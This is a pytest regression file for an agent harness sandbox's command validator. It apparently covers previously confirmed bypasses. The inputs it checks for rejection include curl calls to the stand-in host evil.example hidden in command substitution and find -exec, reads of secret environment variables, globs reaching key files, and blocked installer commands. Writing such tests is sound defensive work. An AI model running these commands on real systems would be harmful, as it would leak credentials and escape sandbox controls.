"""S1-R03 — sandbox boundary hardening regression tests.

Every case here was a CONFIRMED bypass executed against the previous
validator (register §R-03): double-quoted `$( )`/backticks, `find -exec`,
globs hiding forbidden paths, `${VAR}` braced forms, unconstrained
installers, `HARNESS_` env passthrough, streaming exec without a live
timeout, and destroy killing only direct children.
"""

import asyncio

import pytest

from harness_sandbox.config import config
from harness_sandbox.local_runner import LocalSandboxRunner
from harness_sandbox.policy import (
    SandboxCommandTimeoutError,
    SecurityPolicyViolationError,
    sanitize_environment,
    validate_command,
)
from harness_sandbox.service import SandboxService

# ---------------------------------------------------------------------------
# R-03a — shell-feature bypasses
# ---------------------------------------------------------------------------


def test_double_quoted_command_substitution_rejected():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command('echo "$(curl http://evil.example)"')
    with pytest.raises(SecurityPolicyViolationError):
        validate_command('echo "`id`"')


def test_single_quoted_substitution_stays_literal():
    """/bin/sh does not expand inside single quotes — the text is inert."""
    validate_command("grep '$(not-executed)' src/app.py")


def test_braced_and_unbraced_sensitive_vars_rejected():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("echo ${AWS_SECRET_ACCESS_KEY}")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("echo $AWS_SECRET_ACCESS_KEY")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("echo x${GITHUB_TOKEN}y")


def test_non_sensitive_var_still_allowed():
    validate_command("echo ${HOME}")


def test_find_exec_rejected_plain_find_allowed():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("find . -exec curl http://evil.example \\;")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("find . -name x -execdir rm -f {} +")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("find . -ok touch /tmp/x \\;")
    validate_command('find . -name "*.py"')


def test_glob_expansion_enforces_forbidden_paths(tmp_path):
    ws = tmp_path / "ws"
    (ws / "db" / "x" / "sensitive").mkdir(parents=True)
    (ws / "db" / "x" / "sensitive" / "init.sql").write_text("CREATE TABLE t(i int);")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command(
            "cat db/*/sensitive/init.sql",
            forbidden_paths=["db/x/sensitive"],
            cwd=str(ws),
        )


def test_glob_expansion_blocks_secret_matches(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "server.key").write_text("fake-key")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("ls *.key", cwd=str(ws))


def test_safe_glob_still_allowed(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "app.py").write_text("print(1)\n")
    validate_command("ls *.py", cwd=str(ws))


# ---------------------------------------------------------------------------
# R-03b — installers
# ---------------------------------------------------------------------------


def test_installers_blocked():
    blocked = [
        "pip install requests",
        "pip3 install -r requirements.txt",
        "python -m pip install requests",
        "python3 -m pip install requests",
        "npm i lodash",
        "npm install",
        "npm ci",
        "yarn add lodash",
        "pnpm install",
        "npx --yes create-thing",
        "pnpm dlx cowsay",
        "yarn dlx cowsay",
    ]
    for cmd in blocked:
        with pytest.raises(SecurityPolicyViolationError):
            validate_command(cmd)
    validate_command("npm test")
    validate_command("npx vitest run")


# ---------------------------------------------------------------------------
# R-03e — HARNESS_ env (DB creds) stripped from agent processes
# ---------------------------------------------------------------------------


def test_harness_env_stripped():
    clean = sanitize_environment(
        {
            "PATH": "/usr/bin",
            "HARNESS_DATABASE_URL": "postgresql://harness:harness@db:5432/harness",
            "HARNESS_MODELS_URL": "http://models:8003",
            "TERM": "xterm",
        }
    )
    assert "HARNESS_DATABASE_URL" not in clean
    assert "HARNESS_MODELS_URL" not in clean
    assert clean["TERM"] == "xterm"


# ---------------------------------------------------------------------------
# R-03d — explicit confinement request fails closed
# ---------------------------------------------------------------------------


def test_explicit_unavailable_confinement_fails_closed(tmp_path):
    import sys

    unavailable = "landlock" if sys.platform == "darwin" else "seatbelt"
    runner = LocalSandboxRunner(storage_root=tmp_path / "tasks", confinement=unavailable)
    with pytest.raises(SecurityPolicyViolationError):
        runner.create_task("t1", "o/r", "m")


# ---------------------------------------------------------------------------
# R-03f — execution time budget + process-group teardown
# ---------------------------------------------------------------------------

HUNG = 'python3 -c "import time; time.sleep(30)"'


async def test_streaming_timeout_bounds_hung_command(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "default_timeout_seconds", 1)
    runner = LocalSandboxRunner(storage_root=tmp_path / "tasks", confinement="off")
    svc = SandboxService(runner=runner)
    handle = svc.run_task("t1", "o/r", "m", [])
    stream = svc.exec(handle, HUNG)
    with pytest.raises(SandboxCommandTimeoutError):
        await asyncio.wait_for(stream.__anext__(), timeout=10)


async def test_streaming_timeout_bounds_dripping_output(tmp_path, monkeypatch):
    """Output keeps flowing, so EOF never arrives — the budget must still fire."""
    monkeypatch.setattr(config, "default_timeout_seconds", 1)
    runner = LocalSandboxRunner(storage_root=tmp_path / "tasks", confinement="off")
    svc = SandboxService(runner=runner)
    handle = svc.run_task("t2", "o/r", "m", [])
    drip = (
        'python3 -c "import time, sys\n'
        'for i in range(30):\n'
        ' print(i, flush=True); time.sleep(0.5)"'
    )
    stream = svc.exec(handle, drip)

    async def _drain():
        async for _line in stream:
            pass

    with pytest.raises(SandboxCommandTimeoutError):
        await asyncio.wait_for(_drain(), timeout=15)


async def test_destroy_kills_whole_process_group(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "default_timeout_seconds", 60)
    runner = LocalSandboxRunner(storage_root=tmp_path / "tasks", confinement="off")
    svc = SandboxService(runner=runner)
    handle = svc.run_task("t3", "o/r", "m", [])
    import os

    run = asyncio.create_task(svc.exec_structured(handle, HUNG))
    await asyncio.sleep(0.7)
    proc = runner.active_tasks[handle.taskId]["procs"][0]
    # S1-R03f: the child leads its own process group, so group-kill reaches
    # grandchildren that a direct-child SIGKILL would leave behind.
    assert os.getpgid(proc.pid) == proc.pid
    runner.destroy(handle)
    result = await asyncio.wait_for(run, timeout=10)
    assert result.exit_code == -9
